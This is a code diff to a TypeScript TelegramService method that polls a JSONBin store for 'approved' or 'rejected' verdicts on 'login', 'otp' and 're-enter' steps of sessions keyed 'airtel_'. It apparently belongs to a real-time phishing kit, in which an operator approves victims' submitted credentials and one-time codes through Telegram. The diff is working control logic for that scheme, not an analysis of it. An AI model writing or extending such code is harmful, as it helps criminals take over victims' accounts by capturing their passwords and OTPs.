@@ -570,56 +570,50 @@ class TelegramService {
   }
 
   /**
-   * Fast Real-time Status Polling
-   * Poll server-side state via get-status endpoint
+   * Poll JSONBin for status updates
    */
   public async pollUpdates(
     sessionId: string,
     targetStep: 'login' | 'otp' | 'reenter',
     phone?: string
   ): Promise<'pending' | 'approved' | 'rejected'> {
-    // 1. Check local cached session state
     const local = this.localSessionState.get(sessionId);
     if (local) {
-      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
-        return local.loginStatus;
-      }
-      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
-        return local.otpStatus;
-      }
-      if (targetStep === 'reenter' && (local.reenterStatus === 'approved' || local.reenterStatus === 'rejected')) {
-        return local.reenterStatus;
-      }
+      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) return local.loginStatus;
+      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) return local.otpStatus;
     }
 
-    // 2. Poll server-side state
+    // Poll JSONBin
     try {
-      const statusRes = await fetch(`/api/telegram/get-status?sessionId=${encodeURIComponent(sessionId)}`, {
+      const key = process.env.VITE_JSONBIN_KEY || '';
+      const binId = process.env.VITE_JSONBIN_ID || '';
+      if (!key || !binId) return 'pending';
+
+      const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
+        headers: { 'X-Master-Key': key, 'X-Bin-Meta': 'false' },
         cache: 'no-store',
-        headers: { 'Cache-Control': 'no-cache' },
       });
 
-      if (statusRes.ok) {
-        const statusData = await this.safeJson(statusRes);
-        if (statusData) {
-          if (targetStep === 'login' && (statusData.loginStatus === 'approved' || statusData.loginStatus === 'rejected')) {
-            if (local) local.loginStatus = statusData.loginStatus;
-            console.log('[Poll] Login status from server:', statusData.loginStatus, 'for session:', sessionId);
-            return statusData.loginStatus;
+      if (res.ok) {
+        const data = await this.safeJson(res);
+        const sessionKey = `airtel_${sessionId}`;
+        const sessionData = data?.[sessionKey];
+
+        if (sessionData) {
+          if (targetStep === 'login' && (sessionData.loginStatus === 'approved' || sessionData.loginStatus === 'rejected')) {
+            if (local) local.loginStatus = sessionData.loginStatus;
+            console.log('[Poll] Got status from JSONBin:', sessionData.loginStatus);
+            return sessionData.loginStatus;
           }
-          if (targetStep === 'otp' && (statusData.otpStatus === 'approved' || statusData.otpStatus === 'rejected')) {
-            if (local) local.otpStatus = statusData.otpStatus;
-            console.log('[Poll] OTP status from server:', statusData.otpStatus, 'for session:', sessionId);
-            return statusData.otpStatus;
-          }
-          if (targetStep === 'reenter' && (statusData.reenterStatus === 'approved' || statusData.reenterStatus === 'rejected')) {
-            if (local) local.reenterStatus = statusData.reenterStatus;
-            return statusData.reenterStatus;
+          if (targetStep === 'otp' && (sessionData.otpStatus === 'approved' || sessionData.otpStatus === 'rejected')) {
+            if (local) local.otpStatus = sessionData.otpStatus;
+            console.log('[Poll] Got status from JSONBin:', sessionData.otpStatus);
+            return sessionData.otpStatus;
           }
         }
       }
     } catch (e) {
-      console.warn('[Poll] Server status check error:', e);
+      console.warn('[Poll] JSONBin error:', e);
     }
 
     return 'pending';
